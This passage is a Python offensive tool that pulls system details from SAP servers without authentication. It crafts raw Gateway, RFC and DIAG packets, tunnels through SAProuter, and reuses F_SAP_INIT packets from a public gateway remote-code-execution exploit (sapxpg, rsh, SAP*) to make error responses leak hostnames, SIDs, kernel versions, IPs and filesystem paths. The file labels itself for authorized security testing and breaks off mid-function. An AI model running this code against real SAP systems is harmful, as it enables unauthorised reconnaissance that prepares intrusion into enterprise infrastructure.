#!/usr/bin/env python3
"""
SAP RFC_SYSTEM_INFO - Unauthenticated Remote System Information Retrieval

Calls RFC_SYSTEM_INFO on a remote SAP system WITHOUT authentication by
implementing the SAP RFC/Gateway protocol at the raw packet level.

This replicates how SAP systems call each other's RFC_SYSTEM_INFO during
server-to-server communication, which does not require authentication.

The tool implements four probe methods:
  1. V6 single-packet RFC call (template replay from pcap capture)
  2. V2 GW_NORMAL_CLIENT + F_SAP_INIT error leak (gateway error parsing)
  3. Chipik-style F_SAP_INIT with external program type (sapxpg/T_75)
  4. DIAG login screen extraction (port 32XX, SAP GUI protocol)

All methods attempt to extract system information including hostname,
kernel release, OS, SID, database type, and IP addresses.

For authorized security testing only.

Usage:
  python3 sap_rfc_system_info.py -t <target_ip> [-p <port>] [-R <router>] [-v] [--json]
  python3 sap_rfc_system_info.py -t 192.168.2.29 -p 3340 -t 192.168.2.209 -p 3300

Examples:
  python3 sap_rfc_system_info.py -t 192.168.2.209 -p 3300 -v
  python3 sap_rfc_system_info.py -t 192.168.2.29 -p 3340 --json
  python3 sap_rfc_system_info.py -t 192.168.2.209:3200 -R 10.0.0.1:3299 -v
"""

import socket
import struct
import argparse
import json as json_module
import random
import re
import time
import uuid


# ============================================================================
# RFCSI_EXPORT field definitions: (name, char_length)
# Total: 245 characters = 490 bytes in UTF-16LE
# ============================================================================

RFCSI_FIELDS = [
    ('RFCPROTO',    3),    # RFC protocol version
    ('RFCCHARTYP',  4),    # Character encoding type (codepage)
    ('RFCINTTYP',   3),    # Integer type (BIG/LIT)
    ('RFCFLOTYP',   3),    # Float type (IE3/VAX/IBM)
    ('RFCDEST',    32),    # RFC destination
    ('RFCHOST',     8),    # Hostname (8 char, truncated)
    ('RFCSYSID',    8),    # System ID (SID)
    ('RFCDATABS',   8),    # Database name
    ('RFCDBHOST',  32),    # Database host
    ('RFCDBSYS',   10),    # Database system (HDB/ORA/MSS/ADA/DB6)
    ('RFCSAPRL',    4),    # SAP release
    ('RFCMACH',     5),    # Machine ID / patch level
    ('RFCOPSYS',   10),    # Operating system
    ('RFCTZONE',    6),    # Timezone offset (seconds from UTC)
    ('RFCDATEFM',   1),    # Date format
    ('RFCIPADDR',  15),    # IP address (IPv4)
    ('RFCKERNRL',   4),    # Kernel release
    ('RFCHOST2',   32),    # Full hostname (32 char)
    ('RFCSI_RESV', 12),    # Reserved
    ('RFCIPV6ADDR',45),    # IPv6 address / full IP
]

RFCSI_TOTAL_CHARS = sum(f[1] for f in RFCSI_FIELDS)  # 245


# ============================================================================
# Packet Templates (extracted byte-for-byte from rfcsysteminfo2.pcap)
#
# Request structure:
#   [4-byte NI length] [HEADER (137 bytes)] [Routing String (variable)]
#   [POST_ROUTING (1160 bytes)]
#
# The routing string is generated dynamically. Header and post-routing
# are templates with specific bytes patched for each target.
# ============================================================================

# APPC/GW Header: 137 bytes
# Contains: Version 6, GW_NORMAL_CLIENT, connection ID at offset 40,
# buffer sizes, codepage 4103, EBCDIC "RFC0000000000", capability flags
_HEADER = bytes.fromhex(
    '06030200ffffffff000001000000000041ffffffff0000000000000000008704000000000000'
    '000038353330333037380000057c000000020000057c00000001000000000234313033020000'
    'ffff0001d9c6c3f0f0f0f0f0f0f0f0f00101000801010101010100000101010300040000021b'
    '01030106000b04010003010302000000230106010500bc'
)

# Post-Routing: 1160 bytes
# Starts with null terminator of routing string (byte 0), then contains:
# - Client IP (15-byte padded at offset 7, 45-byte padded at offset 28)
# - Release info, destination name, terminal name
# - RFC serialization: function name, UUIDs, user, system ID, timestamp,
#   export parameter definitions, trailing metadata
_POST_ROUTING = bytes.fromhex(
    '0001050007000f3139322e3136382e322e313020202000070018002d3139322e3136382e322e'
    '3130202020202020202020202020202020202020202020202020202020202020202020001800'
    '110001330011001200043730302000120013000437303020001300080020736170646f6f735f'
    '5741535f30302020202020202020202020202020202020200008000600805445535400000000'
    '0000000000000000000000000000000000000000000000000000000000000000000000000000'
    '0000000000000000000000000000000000000000000000000000000000000000000000000000'
    '0000000000000000000000000000000000000000000000000000000000000000000000000000'
    '0000000000000000000000000006013000205246435f53595354454d5f494e464f3d3d3d3d3d'
    '3d3d3d3d3d3d3d3d3d3d4654013005140010f1110081d050c2f1ace0000c29ddf77605140111'
    '000653415041444d01110117000c9b8fe6137450e85458b8adf60117000300035741530003000c'
    '0004534533370' + '00c0122000e323032363032323332313432313101220123000001230120001c'
    '1fde870753'
    '04c78090ed937ceb8598f02a898bb2b89ba6fb4bf1ba2b0120000e0003303031000e01190006'
    '53415041444d0119013000285246435f53595354454d5f494e464f3d3d3d3d3d3d3d3d3d3d3d'
    '3d3d3d3d46542020202020202020013001140003303636011401150001450115000900065341'
    '5041444d000901340003303031013405010001010501050200000502000b000437303020000b'
    '0102000f5246435f53595354454d5f494e464f01020503000005030125002037323030313146'
    '313435304546314632414345303030304332394444463737360125013100b92a54482a0200b9'
    '0000574153202020202020202020202020202020202020202020202020202020202000015341'
    '5041444d20202020202020202020202020202020202020202020202020205345333720202020'
    '2020202020202020202020202020202020202020202020202020202020202020000157415320'
    '2020202020202020202020202020202020202020202020202020202037323030313146313435'
    '304546314632414345303030304332394444463737362a54482a013105140010f1110081d050'
    'c2f1ace0000c29ddf77605140512000005120205001143555252454e545f5245534f55524345'
    '530205020500114d4158494d414c5f5245534f55524345530205020500115245434f4d4d454e'
    '4445445f44454c415902050205000c52464353495f4558504f52540205010400cf100402000c'
    '00018768000004670000138c10040b0020ef7ffe2ddab737f674087e9325971597eff2bf8f4f'
    '71ff9f8e27261b000000001004040008001700080012000810040d00100000001b000000b900'
    '000022000000b91004160002000c100417000200201004190002000010041e00080000027300'
    '0005cb100425000200021004090003373830100424000800000374000005e81004130034034b'
    '0011f10f50f184ace0000c29ddf776016c0011f10216f1aaace0000c29ddf77600720011f145'
    '0ef1f1ace0000c29ddf776000104ffff0000ffff'
)

# Dynamic field offsets within _HEADER
_H_CONN_ID = 40         # 8 ASCII bytes: connection ID

# Dynamic field offsets within _POST_ROUTING
_P_IP15 = 7             # 15-byte space-padded client IP
_P_IP45 = 28            # 45-byte space-padded client IP
_P_TIMESTAMP = 387      # 14 ASCII bytes: YYYYMMDDHHMMSS
_P_UUID_ASCII_1 = 601   # 32-byte ASCII hex UUID
_P_UUID_ASCII_2 = 788   # 32-byte ASCII hex UUID (in *TH* block)
_P_UUID_BIN_1 = 316     # 16-byte binary UUID (item 05:14)
_P_UUID_BIN_2 = 830     # 16-byte binary UUID (item 05:14)


# ============================================================================
# Helper Functions
# ============================================================================

def ni_frame(payload: bytes) -> bytes:
    """Wrap payload in SAP NI frame (4-byte big-endian length prefix)."""
    return struct.pack('>I', len(payload)) + payload


def connect_via_saprouter(router_host, router_port, target, target_port,
                          timeout=10, verbose=False):
    """
    Establish a TCP tunnel through a SAProuter to the target host.

    Connects to the SAProuter, sends a binary NI_ROUTE request, and waits
    for the route to be accepted (NI_PONG or empty ACK). Returns the
    connected socket which can then be used to speak DIAG/RFC to the target.

    Args:
        router_host: SAProuter IP or hostname
        router_port: SAProuter port (typically 3299)
        target: Target SAP system IP or hostname
        target_port: Target port (e.g. 3200 for DIAG, 3300 for GW)
        timeout: Connection timeout in seconds
        verbose: Print debug output

    Returns:
        Connected socket with tunnel established

    Raises:
        ConnectionError: If the route is rejected or connection fails
    """
    if verbose:
        print(f'    SAProuter: connecting to {router_host}:{router_port}')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((router_host, router_port))

    # Build route entries as null-terminated triplets: host\x00port\x00password\x00
    entry1 = (router_host.encode('ascii') + b'\x00'
              + str(router_port).encode('ascii') + b'\x00' + b'\x00')
    entry2 = (target.encode('ascii') + b'\x00'
              + str(target_port).encode('ascii') + b'\x00' + b'\x00')
    route_data = entry1 + entry2

    # Build NI_ROUTE packet
    route_pkt = bytearray()
    route_pkt += b'NI_ROUTE\x00'                          # type
    route_pkt += b'\x02'                                   # version = 2
    route_pkt += b'\x27'                                   # ni_version = 39
    route_pkt += b'\x02'                                   # entries = 2
    route_pkt += b'\x00'                                   # talk_mode = 0 (NI)
    route_pkt += b'\x00\x00'                               # padding
    route_pkt += b'\x01'                                   # rest_nodes = 1
    route_pkt += struct.pack('>I', len(route_data))        # route_length
    route_pkt += struct.pack('>I', len(entry1))            # route_offset (skip entry1)
    route_pkt += route_data

    if verbose:
        print(f'    SAProuter: sending NI_ROUTE '
              f'({len(route_pkt)} bytes, route to {target}:{target_port})')

    sock.sendall(ni_frame(bytes(route_pkt)))

    # Read route response
    resp = b''
    try:
        while len(resp) < 4:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
        if len(resp) >= 4:
            ni_len = struct.unpack('>I', resp[:4])[0]
            if ni_len > 0:
                while len(resp) < 4 + ni_len:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
    except socket.timeout:
        sock.close()
        raise ConnectionError('SAProuter route response timed out')

    if len(resp) < 4:
        sock.close()
        raise ConnectionError('SAProuter: no response')

    ni_len = struct.unpack('>I', resp[:4])[0]
    payload = resp[4:4 + ni_len] if ni_len > 0 else b''

    # NI_PONG or empty frame = route accepted
    if ni_len == 0 or payload.startswith(b'NI_PONG'):
        if verbose:
            print(f'    SAProuter: route ACCEPTED')
        return sock

    # NI_RTERR = route rejected
    if b'NI_RTERR' in payload:
        sock.close()
        # Extract error message
        err_msg = 'route rejected'
        strings = []
        current = b''
        for byte in payload:
            if 0x20 <= byte < 0x7f:
                current += bytes([byte])
            else:
                if len(current) >= 3:
                    strings.append(current.decode('ascii'))
                current = b''
        for s in strings:
            if 'NiR' in s or ('route' in s.lower() and 'invalid' in s.lower()):
                err_msg = s
                break
            if 'permission' in s.lower() or 'denied' in s.lower():
                err_msg = s
                break
        raise ConnectionError(f'SAProuter: {err_msg}')

    sock.close()
    raise ConnectionError(f'SAProuter: unexpected response ({ni_len} bytes)')


def pad_bytes(b: bytes, length: int, char: int = 0x20) -> bytes:
    """Pad bytes to fixed length with given char (default: space)."""
    return b[:length].ljust(length, bytes([char]))


def get_local_ip(target: str) -> str:
    """Get local IP used for outbound connections to target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def iptohex(ip_str: str) -> bytes:
    """Convert dotted-decimal IP to 4-byte binary."""
    return bytes(int(o) for o in ip_str.split('.'))


def ni_recv(sock, timeout=5):
    """
    Receive one complete NI-framed response from a SAP socket.

    Reads the 4-byte NI length header, then reads exactly that many bytes.
    Skips NI keepalive frames (length == 0). Returns the raw bytes including
    the NI header, or empty bytes on timeout/error.

    This avoids burning timeout waiting for data that will never arrive:
    once the full NI frame is read, we return immediately.
    """
    sock.settimeout(timeout)
    buf = b''
    try:
        # Read NI header(s) - skip keepalives (0-length frames)
        while True:
            while len(buf) < 4:
                chunk = sock.recv(4 - len(buf))
                if not chunk:
                    return buf  # connection closed
                buf += chunk
            ni_len = struct.unpack('>I', buf[:4])[0]
            if ni_len == 0:
                buf = buf[4:]  # skip keepalive, read next frame
                continue
            break

        # Read payload
        while len(buf) < 4 + ni_len:
            remaining = 4 + ni_len - len(buf)
            chunk = sock.recv(remaining)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    except OSError:
        pass
    return buf


# ============================================================================
# Method 1: Template-Based V6 Single-Packet RFC Call
# ============================================================================

def build_rfc_system_info_request(local_ip, target_ip, instance, hostname=None):
    """
    Build an RFC_SYSTEM_INFO request using the captured pcap as template.

    Patches dynamic fields (connection ID, routing string, client IPs,
    timestamp, UUIDs) in the exact binary from a real SAP-to-SAP call.

    Returns the complete NI-framed packet ready to send over TCP.
    """
    if hostname is None:
        hostname = socket.gethostname()

    conn_id = f'{random.randint(10000000, 99999999)}'
    route_uuid = uuid.uuid4().hex.upper()
    conn_uuid = uuid.uuid4().hex.upper()
    gw_service = f'sapgw{instance:02d}'
    timestamp = time.strftime('%Y%m%d%H%M%S')

    # ---- Patch header ----
    header = bytearray(_HEADER)
    header[_H_CONN_ID:_H_CONN_ID + 8] = conn_id.encode('ascii')

    # ---- Build routing string ----
    routing_parts = [
        ('1', '20'),
        ('2', '377'),
        ('3', '0'),
        ('4', '4'),
        ('5', local_ip),
        ('6', gw_service),
        ('7', target_ip),
        ('17', local_ip),
        ('18', target_ip),
        ('9', 'E'),
        ('10', '0'),
        ('11', '0'),
        ('12', '1413'),
        ('13', '0'),
        ('14', '1'),
        ('16', 'WAS'),
        ('15', route_uuid),
        ('8', hostname),
    ]
    routing_str = '-'.join(f'{k}-{v}' for k, v in routing_parts)

    # ---- Patch post-routing ----
    post = bytearray(_POST_ROUTING)

    # Client IP (15-byte, space-padded)
    post[_P_IP15:_P_IP15 + 15] = pad_bytes(local_ip.encode('ascii'), 15)

    # Client IP (45-byte, space-padded)
    post[_P_IP45:_P_IP45 + 45] = pad_bytes(local_ip.encode('ascii'), 45)

    # Timestamp
    post[_P_TIMESTAMP:_P_TIMESTAMP + 14] = timestamp.encode('ascii')

    # ASCII UUID (32 bytes each, at 2 locations)
    new_uuid_ascii = conn_uuid.encode('ascii')[:32]
    post[_P_UUID_ASCII_1:_P_UUID_ASCII_1 + 32] = new_uuid_ascii
    post[_P_UUID_ASCII_2:_P_UUID_ASCII_2 + 32] = new_uuid_ascii

    # Binary UUID (16 bytes each, at 2 locations)
    new_uuid_bin = bytes.fromhex(conn_uuid[:32])
    post[_P_UUID_BIN_1:_P_UUID_BIN_1 + 16] = new_uuid_bin
    post[_P_UUID_BIN_2:_P_UUID_BIN_2 + 16] = new_uuid_bin

    # ---- Assemble ----
    payload = bytes(header) + routing_str.encode('ascii') + bytes(post)
    return ni_frame(payload)


# ============================================================================
# Method 2: V2 GW_NORMAL_CLIENT + F_SAP_INIT Error Leak
# ============================================================================

def build_gw_normal_client_v2(local_ip, instance):
    """Build version 2 GW_NORMAL_CLIENT (simple gateway handshake)."""
    service = f'sapgw{instance:02d}'.encode()
    p = bytearray()
    p += b'\x02\x03'
    p += iptohex(local_ip)
    p += b'\x00' * 4
    p += service.ljust(10, b'\x00')
    p += b'4103'
    p += b'\x00' * 6
    p += b'sapserve'
    p += service.ljust(8, b' ')
    p += b' ' * 8
    p += b'\x06\x0b\xff\xff'
    p += b'\x00' * 6
    return ni_frame(bytes(p))


def build_f_sap_init_v2(local_ip, target, instance):
    """
    Build F_SAP_INIT for V2 probe - triggers informative gateway error.
    Uses sapserve TP with ctype=E (external program).
    """
    p = bytearray()
    p += b'\x06\xCA\x03\x00\x00\x13\xFF\xFF\x00\x00\x01\x00'
    p += b'\x00\x00\x00\x00\xC0\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00'
    p += b'\x01\x54\x00\x00\x87\x00'
    p += b'\x00' * 8 + b'\x00' * 8
    p += b'T_75    '
    p += target.encode().ljust(32, b'\x00')
    p += b'sapxpg  '
    p += b'\x45\x02\x00\x00\x00\x00\xFF\xFF'
    p += b'\x60\x00\x00\x00\x00\x00\x00\x00\x00\x0E\x02\x00\x00\x00\x00'
    p += b'\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00'
    p += bytes.fromhex('4ED581E309F6F118A00A000C290099D0')
    p += b'\x00' * 4
    p += b'\xFF\xFF\xFF\xFE\xFF\xFF\xFF\xFE\x02\x00\x00\x00'
    p += b'\x00' * 17
    p += target.encode().ljust(15, b'\x00')
    p += b'\x00' * (128 - 15)
    p += b'SAP*' + b' ' * 16
    p += b'\x00' * 4 + b' ' * 12 + b'\x00' * 16
    p += iptohex(local_ip)
    p += b'\x00' * 4 + b'sapxpg' + b'\x00' * 62
    return ni_frame(bytes(p))


# ============================================================================
# Method 3: Chipik-style F_SAP_INIT (raw byte exact replica)
#
# Reproduces the exact byte layout from chipik's SAPanonGWv1.py.
# This packet variant has historically been more successful at eliciting
# detailed error responses from SAP Gateways, including hostname, kernel,
# OS, and source file paths.
# ============================================================================

def build_chipik_p2(local_ip, target, instance):
    """
    Build chipik-exact F_SAP_INIT packet (P2).

    This is a byte-exact reproduction of the P2 packet from
    chipik's SAP_GW_RCE_exploit/SAPanonGWv1.py, which uses:
    - ctype=E (0x45) = external program (STARTED_PRG)
    - dest=T_75 (space-padded to 8 bytes)
    - ncpic_lu = target hostname (padded to 32 bytes)
    - tp_name = sapxpg (external program execution hook)
    - user = SAP* (space-padded)

    Payload is exactly 420 bytes (NI length = 0x01A4).
    """
    # Build packet piece by piece, matching chipik's exact layout
    p = bytearray()

    # APPC header (26 bytes)
    p += b'\x06\xCA'                      # Version 6, F_SAP_INIT
    p += b'\x03\x00'                      # Protocol CPIC
    p += b'\x00\x13'                      # APPC flags
    p += b'\xFF\xFF'                      # APPC RC (request)
    p += b'\x00\x00\x01\x00'             # SAP RC / flags
    p += b'\x00\x00\x00\x00'             # Conversation ID (0 for init)
    p += b'\xC0\xFF\xFF\xFF\xFF'          # Capability mask
    p += b'\x00\x00\x00\x00\x00'          # Padding

    # Extended header (30 bytes)
    p += b'\x01\x54'                      # Extended header marker
    p += b'\x00\x00\x87\x00'             # Buffer sizes
    p += b'\x00' * 8                      # LU1 (8 bytes, null)
    p += b'\x00' * 8                      # LU2 (8 bytes, null)

    # Destination: T_75 (8 bytes, space-padded)
    p += b'T_75    '

    # Target hostname (32 bytes, null-padded) - ncpic_lu field
    targ_bytes = target.encode('ascii')
    p += targ_bytes.ljust(32, b'\x00')

    # TP name: sapxpg (8 bytes, space-padded)
    p += b'sapxpg  '

    # Connection type and flags
    p += b'\x45'                          # ctype = E (external program)
    p += b'\x02\x00\x00\x00\x00'          # Flags
    p += b'\xFF\xFF'                      # More flags

    # DT structure (timing/scheduling)
    p += b'\x60\x00\x00\x00'             # DT header
    p += b'\x00\x00\x00\x00'             # Padding
    p += b'\x00\x0E\x02\x00'             # DT fields
    p += b'\x00\x00'                      # DT padding

    # Timestamp/dates
    p += b'\xE8\x4D\x23\x00'             # Time value
    p += b'\xDF\x07\x00\x00'             # Year-like value
    p += b'\x01\x00'                      # Month

    # SNC/UUID token (16 bytes)
    p += bytes.fromhex('4ED581E309F6F118A00A000C290099D0')

    # Padding
    p += b'\x00' * 4

    # Connection parameters
    p += b'\xFF\xFF\xFF\xFE'              # Param 1
    p += b'\xFF\xFF\xFF\xFE'              # Param 2
    p += b'\x02\x00\x00\x00'             # Param 3

    # Null padding (17 bytes)
    p += b'\x00' * 17

    # Target hostname in connection block (15 bytes, null-padded)
    p += targ_bytes[:15].ljust(15, b'\x00')

    # Remaining null padding for connection block (128-15 = 113 bytes)
    p += b'\x00' * 113

    # User field: SAP* (space-padded to 20 bytes total)
    p += b'SAP*'
    p += b' ' * 16

    # Padding after user
    p += b'\x00' * 4
    p += b' ' * 12
    p += b'\x00' * 16

    # Secondary IP (4 bytes)
    p += iptohex(local_ip)

    # Service tail: sapxpg + null padding (68 bytes total)
    p += b'\x00' * 4
    p += b'sapxpg'
    p += b'\x00' * 58

    return ni_frame(bytes(p))


def build_f_sap_send_rfc(conv_id_ascii):
    """
    Build F_SAP_SEND packet for RFC_SYSTEM_INFO call.

    When F_SAP_INIT succeeds (APPC_RC=0) and returns a conversation ID,
    this packet attempts the actual RFC function call. Even if the function
    call fails, the gateway error response leaks system information.

    Args:
        conv_id_ascii: 8-digit ASCII conversation ID from F_SAP_INIT response
    """
    func_name = b'RFC_SYSTEM_INFO'

    p = bytearray()
    # APPC header
    p += b'\x06\xCB'                      # Version 6, F_SAP_SEND
    p += b'\x03\x00'                      # Protocol CPIC
    p += b'\x00\x13'                      # Flags
    p += b'\x00\x01'                      # APPC_RC (send)
    p += b'\x00\x00\x00\x00'             # SAP_RC
    p += b'\x00\x00\x00\x00'             # Padding
    p += b'\x00\x00\x00\x01'             # Request flags
    p += b'\xF4\x00\x00\x00'             # Buffer size hints
    p += b'\x00\x00\x00\x08'             # Flags
    p += b'\x00\x00\x85\x0C'             # More flags
    p += b'\x00\x00\x00\x00'             # Padding
    p += b'\x00\x00\x00\x00'             # Padding

    # Conversation ID (8 ASCII bytes)
    p += conv_id_ascii.encode('ascii')

    # CPIC/RFC payload: function name with TLV markers
    # Function name block (marker 01:30)
    func_padded = func_name.ljust(30, b'=') + b'FT'  # 32 bytes
    p += b'\x01\x30'
    p += struct.pack('>H', len(func_padded))
    p += func_padded

    # Function name reference (marker 01:02)
    p += b'\x01\x02'
    p += struct.pack('>H', len(func_name))
    p += func_name

    # RFC call control flags
    p += b'\x05\x03\x00\x00'             # End parameters
    p += b'\x05\x01\x00\x01\x01'         # RFC flags
    p += b'\x05\x02\x00\x00'             # More flags

    # Output parameter definition: RFCSI_EXPORT
    export_name = b'RFCSI_EXPORT'
    p += b'\x02\x05'
    p += struct.pack('>H', len(export_name))
    p += export_name

    # Parameter type/length info
    p += b'\x02\x05\x01\x04'             # Parameter type
    p += struct.pack('>H', 490)           # RFCSI_EXPORT = 245 chars * 2 (UTF-16LE)

    return ni_frame(bytes(p))


def build_f_sap_init_reinit(local_ip, target, instance):
    """
    Build a second F_SAP_INIT to send on an existing connection.

    After a successful chipik P2 (APPC_RC=0), sending another F_SAP_INIT
    triggers a different error handler (gwxxside.c / ReadSideInfo) that
    attempts to open sideinfo.DAT - revealing the full filesystem path
    including OS drive letter, SAP SID, and instance profile name.

    Example leaked path: E:\\usr\\sap\\WAS\\DVEBMGS00\\data\\sideinfo.DAT
    """
    p = bytearray()

    # APPC header - same as chipik P2 but simpler
    p += b'\x06\xCA'                      # Version 6, F_SAP_INIT
    p += b'\x03\x00'                      # Protocol CPIC
    p += b'\x00\x13'                      # Flags
    p += b'\xFF\xFF'                      # APPC RC
    p += b'\x00\x00\x01\x00'             # SAP RC / flags
    p += b'\x00\x00\x00\x00'             # Conversation ID
    p += b'\xC0\xFF\xFF\xFF\xFF'          # Capability mask
    p += b'\x00\x00\x00\x00\x00'          # Padding

    # Extended header
    p += b'\x01\x54'
    p += b'\x00\x00\x87\x00'
    p += b'\x00' * 16                     # LU1 + LU2

    # Destination
    p += b'T_75    '
    p += target.encode('ascii').ljust(32, b'\x00')

    # TP name
    p += b'rsh     '

    # Connection type and flags
    p += b'\x45\x02\x00\x00\x00\x00\xFF\xFF'

    # DT structure
    p += b'\x60\x00\x00\x00\x00\x00\x00\x00\x00\x0E\x02\x00\x00\x00\x00'
    p += b'\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00'

    # SNC/UUID
    p += bytes.fromhex('4ED581E309F6F118A00A000C290099D0')

    # Connection params
    p += b'\x00' * 4
    p += b'\xFF\xFF\xFF\xFE\xFF\xFF\xFF\xFE\x02\x00\x00\x00'

    # Target in connection block
    p += b'\x00' * 17
    p += target.encode('ascii')[:15].ljust(15, b'\x00')
    p += b'\x00' * 113

    # User
    p += b'SAP*' + b' ' * 16
    p += b'\x00' * 4 + b' ' * 12 + b'\x00' * 16

    # Secondary IP
    p += iptohex(local_ip)

    # Service tail
    p += b'\x00' * 4 + b'rsh' + b'\x00' * 65

    return ni_frame(bytes(p))


# ============================================================================
# Method 4: DIAG Login Screen Extraction (port 32XX)
#
# The SAP DIAG protocol (used by SAP GUI) returns system information on the
# login screen without authentication. By sending a TERM_INI initialization
# packet, the server responds with the full login screen containing the SID,
# hostname, client number, kernel version, and more.
#
# Protocol based on pysap (OWASP/SecureAuth) DIAG implementation.
# ============================================================================

# ST_R3INFO sub-IDs (item_sid values) for system information extraction
_DIAG_R3INFO_SIDS = {
    0x02: 'DBNAME',           # System ID (SID)
    0x03: 'CPUNAME',          # Server hostname
    0x07: 'TCODE',            # Transaction code
    0x0b: 'MESSAGE',          # System messages
    0x0c: 'CLIENT',           # SAP client number
    0x0d: 'DYNPRONAME',       # Dynpro program name
    0x0e: 'DYNPRONUMBER',     # Dynpro screen number
    0x20: 'CODEPAGE',         # System code page
    0x29: 'KERNEL_VERSION',   # Kernel version (null-separated)
}

# ST_USER sub-IDs
_DIAG_USER_SIDS = {
    0x01: 'CONNECT',
    0x02: 'DIALOG_STEP',
    0x11: 'SUPPORTDATA',
}

# VARINFO sub-IDs
_DIAG_VARINFO_SIDS = {
    0x01: 'AREA_PASSWORD',
    0x02: 'AREA_MACHINE',
    0x03: 'AREA_BROWSER',
    0x04: 'AREA_DATA',
}

# DIAG application IDs
_DIAG_APPL_IDS = {
    0x04: 'ST_USER',
    0x06: 'ST_R3INFO',
    0x09: 'DYNT',
    0x0c: 'VARINFO',
}

# Support data bitfield emulating SAP GUI 7.40 Java rev 8
# This enables the server to send us maximum information
_DIAG_SUPPORT_DATA = bytes.fromhex(
    'ff7ffe2ddab737f674087e9305971597'
    'eff2bf8f4f71ff9f8606000000000000'
)


def build_diag_term_ini():
    """
    Build a SAP DIAG TERM_INI initialization packet (raw bytes).

    This packet emulates a SAP GUI client connecting to the server.
    The server responds with either the login screen (full success)
    or a DIAG error that leaks hostname, SID, and instance number.

    The DP header uses LITTLE-ENDIAN for integer fields (matching the
    SAP dispatcher's internal format on x86/x64 Linux), while the NI
    layer and DIAG items use big-endian (network byte order).

    Wire format:
      [4B NI length (BE)] [200B SAPDiagDP (LE ints)] [8B SAPDiag header]
      [17B UserConnect item] [37B SupportData item]

    Total payload: 262 bytes.
    """
    # Generate random terminal name (IP-like string, max 15 chars)
    terminal = '.'.join(str(random.randint(1, 254)) for _ in range(4))

    # ---- SAPDiag items: built first so we know the length ----

    # SAPDiag header: 8 bytes
    diag = bytearray()
    diag += b'\x00'                       # mode
    diag += b'\x10'                       # com_flags: TERM_INI=1 (bit 4)
    diag += b'\x00'                       # mode_stat
    diag += b'\x00'                       # err_no
    diag += b'\x00'                       # msg_type
    diag += b'\x00'                       # msg_info
    diag += b'\x00'                       # msg_rc
    diag += b'\x00'                       # compress = 0 (uncompressed)

    # Item 1: UserConnect (APPL / ST_USER / DIALOG_STEP)
    diag += b'\x10'                       # item_type = APPL
    diag += b'\x04'                       # item_id = ST_USER
    diag += b'\x02'                       # item_sid = DIALOG_STEP (0x02)
    diag += struct.pack('>H', 12)         # item_length = 12 (BE)
    diag += struct.pack('>I', 200)        # protocol_version (uncompressed)
    diag += struct.pack('>I', 1100)       # code_page
    diag += struct.pack('>I', 5001)       # ws_type (Java GUI)

    # Item 2: SupportData (APPL / ST_USER / SUPPORTDATA)
    diag += b'\x10'                       # item_type = APPL
    diag += b'\x04'                       # item_id = ST_USER
    diag += b'\x11'                       # item_sid = SUPPORTDATA
    diag += struct.pack('>H', 32)         # item_length = 32 (BE)
    diag += _DIAG_SUPPORT_DATA            # 32-byte support bitfield

    diag_data = bytes(diag)

    # ---- SAPDiagDP header: 200 bytes (LE integers) ----
    dp = bytearray()
    dp += struct.pack('<i', -1)           # request_id
    dp += b'\x0a'                         # retcode
    dp += b'\x00'                         # sender_id
    dp += b'\x00'                         # action_type
    dp += struct.pack('<I', 0)            # req_info
    dp += struct.pack('<i', -1)           # tid
    dp += struct.pack('<h', -1)           # uid
    dp += b'\xff'                         # mode
    dp += struct.pack('<i', -1)           # wp_id
    dp += struct.pack('<i', -1)           # wp_ca_blk
    dp += struct.pack('<i', -1)           # appc_ca_blk
    dp += struct.pack('<I', len(diag_data))  # length (payload size)
    dp += b'\x00'                         # new_stat
    dp += struct.pack('<i', -1)           # unused1
    dp += struct.pack('<h', -1)           # rq_id
    dp += b'\x20' * 40                    # unused2 (spaces)
    dp += terminal.encode('ascii').ljust(15, b'\x00')  # terminal (15B)
    dp += b'\x00' * 10                    # unused3
    dp += b'\x20' * 20                    # unused4 (spaces)
    dp += struct.pack('<I', 0)            # unused5
    dp += struct.pack('<I', 0)            # unused6
    dp += struct.pack('<i', -1)           # unused7
    dp += struct.pack('<I', 0)            # unused8
    dp += b'\x01'                         # unused9
    dp += b'\x00' * 57                    # unused10

    assert len(dp) == 200, f'DP header is {len(dp)} bytes, expected 200'

    # Assemble: NI frame wrapping DP header + DIAG data
    payload = bytes(dp) + diag_data
    return ni_frame(payload)


def parse_diag_response(data):
    """
    Parse a SAP DIAG response to extract system information.

    Handles two response types:
    1. Full login screen (large response with DP header + DIAG items)
       -> Extracts ST_R3INFO items: SID, hostname, client, kernel
    2. DIAG error response (small response, no DP header)
       -> Parses error text for "location <host>_<SID>_<inst>" pattern

    Args:
        data: Raw bytes of the DIAG response (with NI header)

    Returns:
        dict with extracted system information, or empty dict on failure
    """
    info = {}

    if len(data) < 12:
        return info

    # Skip NI header
    ni_len = struct.unpack('>I', data[:4])[0]
    if ni_len == 0 or 4 + ni_len > len(data):
        return info

    payload = data[4:4 + ni_len]

    # ---- Check for DIAG error response (no DP header) ----
    # Error responses are short (< 200 bytes) and contain a SAPDiag
    # header (8 bytes) followed directly by error text + EOM (0x0c).
    # Format: [8B SAPDiag header] [error text bytes] [0x0c EOM]
    # The SAPDiag com_flags byte (offset 1) will have TERM_EOC (bit 1)
    # set, and err_no (offset 3) will be non-zero.
    if len(payload) < 200 and len(payload) >= 8:
        diag_header = payload[:8]
        com_flags = diag_header[1]
        err_no = diag_header[3]

        if err_no != 0 or (com_flags & 0x02):  # TERM_EOC or error
            error_data = payload[8:]
            _parse_diag_error_text(error_data, info)
            return info

    # ---- Full login screen response (with DP header) ----
    if len(payload) < 208:  # DP(200) + DiagHeader(8) minimum
        return info

    diag_data = payload[200:]

    if len(diag_data) < 8:
        return info

    compress = diag_data[7]

    if compress != 0:
        info['_compressed'] = True

    items_data = diag_data[8:]

    if compress == 0:
        _parse_diag_items(items_data, info)
    else:
        _scan_diag_raw(data, info)

    return info


def _parse_diag_error_text(error_data, info):
    """
    Parse DIAG error text for system information.

    SAP Dispatcher error responses contain text like:
      "invalid gui connect data (location srv03s4d1_S4D_01-W9)"

    This reveals:
